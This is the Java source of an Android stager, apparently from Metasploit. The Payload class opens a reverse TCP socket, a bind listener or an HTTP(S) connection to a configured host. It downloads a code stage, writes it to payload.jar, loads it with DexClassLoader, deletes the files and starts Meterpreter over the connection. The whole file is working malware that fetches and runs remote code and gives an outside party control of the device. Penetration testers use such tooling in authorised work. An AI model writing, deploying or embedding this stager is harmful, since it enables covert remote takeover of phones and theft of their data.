package com.metasploit.stage;

import android.content.Context;
import android.util.Log;

import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import java.util.concurrent.TimeUnit;

import dalvik.system.DexClassLoader;

public class Payload {

    public static final String URL =            "ZZZZ                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ";
    public static final String CERT_HASH =      "WWWW                                        ";
    public static final String TIMEOUTS =    "TTTT                                           ";

    public static long session_expiry;
    public static long comm_timeout;
    public static long retry_total;
    public static long retry_wait;

    private static String[] parameters;

    public static void start(Context context) {
        startInPath(context.getFilesDir().toString());
    }

    public static void startAsync() {
        new Thread() {
            @Override
            public void run() {
                // Execute the payload
                Payload.main(null);
            }
        }.start();
    }

    public static void startInPath(String path) {
        parameters = new String[]{path};
        startAsync();
    }

    public static void main(String[] args) {
        Log.d("msf", "In main()");
        if (args != null) {
            File currentDir = new File(".");
            String path = currentDir.getAbsolutePath();
            parameters = new String[]{path};
        }
        long sessionExpiry;
        long commTimeout;
        long retryTotal;
        long retryWait;
        Log.d("msf", "Timeouts: " + TIMEOUTS.substring(4));
        String[] timeouts = TIMEOUTS.substring(4).trim().split("-");
        try {
            Log.d("msf", "Session Expiry: " + timeouts[0]);
            sessionExpiry = Integer.parseInt(timeouts[0]);
            Log.d("msf", "Comm Timeout: " + timeouts[1]);
            commTimeout = Integer.parseInt(timeouts[1]);
            Log.d("msf", "Retry total: " + timeouts[2]);
            retryTotal = Integer.parseInt(timeouts[2]);
            Log.d("msf", "Retry wait: " + timeouts[3]);
            retryWait = Integer.parseInt(timeouts[3]);
        } catch (NumberFormatException e) {
            return;
        }

        long payloadStart = System.currentTimeMillis();
        session_expiry = TimeUnit.SECONDS.toMillis(sessionExpiry) + payloadStart;
        comm_timeout = TimeUnit.SECONDS.toMillis(commTimeout);
        retry_total = TimeUnit.SECONDS.toMillis(retryTotal);
        retry_wait = TimeUnit.SECONDS.toMillis(retryWait);

        String url = URL.substring(4).trim();
        Log.d("msf", "URL = " + url);
        // technically we need to check for session expiry here as well.
        while (System.currentTimeMillis() < payloadStart + retry_total &&
            System.currentTimeMillis() < session_expiry) {
            try {
                if (url.startsWith("tcp")) {
                    runStagefromTCP(url);
                } else {
                    runStageFromHTTP(url);
                }
                break;
            } catch (Exception e) {
                e.printStackTrace();
            }
            try {
                Thread.sleep(retry_wait);
            } catch (InterruptedException e) {
              break;
            }
        }
    }

    private static void runStageFromHTTP(String url) throws Exception {
        InputStream inStream;
        if (url.startsWith("https")) {
            URLConnection uc = new URL(url).openConnection();
            Class.forName("com.metasploit.stage.PayloadTrustManager").getMethod("useFor", new Class[]{URLConnection.class}).invoke(null, uc);
            inStream = uc.getInputStream();
        } else {
            inStream = new URL(url).openStream();
        }
        OutputStream out = new ByteArrayOutputStream();
        DataInputStream in = new DataInputStream(inStream);
        readAndRunStage(in, out, parameters);
    }

    private static void runStagefromTCP(String url) throws Exception {
        // string is in the format:   tcp://host:port
        String[] parts = url.split(":");
        int port = Integer.parseInt(parts[2]);
        String host = parts[1].split("/")[2];
        Socket sock = null;

        Log.d("msf", "Host is: " + host);
        if (host.equals("")) {
            Log.d("msf", "Bind socket");
            ServerSocket server = new ServerSocket(port);
            sock = server.accept();
            server.close();
        } else {
            Log.d("msf", "Reverse socket");
            sock = new Socket(host, port);
        }

        if (sock != null) {
            Log.d("msf", "Socket connected");
            sock.setSoTimeout(500);
            DataInputStream in = new DataInputStream(sock.getInputStream());
            OutputStream out = new DataOutputStream(sock.getOutputStream());
            readAndRunStage(in, out, parameters);
        }
    }

    private static void readAndRunStage(DataInputStream in, OutputStream out, String[] parameters) throws Exception {
        String path = parameters[0];
        String filePath = path + File.separatorChar + "payload.jar";
        String dexPath = path + File.separatorChar + "payload.dex";

        // Read the class name
        int coreLen = in.readInt();
        Log.d("msf", "Class length: " + coreLen);
        byte[] core = new byte[coreLen];
        in.readFully(core);
        String classFile = new String(core);
        Log.d("msf", "Class: " + classFile);

        // Read the stage
        coreLen = in.readInt();
        Log.d("msf", "Core length: " + coreLen);
        core = new byte[coreLen];
        in.readFully(core);

        File file = new File(filePath);
        Log.d("msf", "Writing to: " + filePath);
        if (!file.exists()) {
            file.createNewFile();
        }
        FileOutputStream fop = new FileOutputStream(file);
        fop.write(core);
        fop.flush();
        fop.close();

        // Load the stage
        Log.d("msf", "Loading into classloader");
        DexClassLoader classLoader = new DexClassLoader(filePath, path, path,
                Payload.class.getClassLoader());
        Class<?> myClass = classLoader.loadClass(classFile);
        Log.d("msf", "Class loaded");
        final Object stage = myClass.newInstance();
        Log.d("msf", "Instance " + (stage == null ? "null" : "created"));
        file.delete();
        new File(dexPath).delete();
        Log.d("msf", "Invoking Meterpreter");
        myClass.getMethod("start",
                new Class[]{DataInputStream.class, OutputStream.class, String[].class})
                .invoke(stage, in, out, parameters);
    }
}
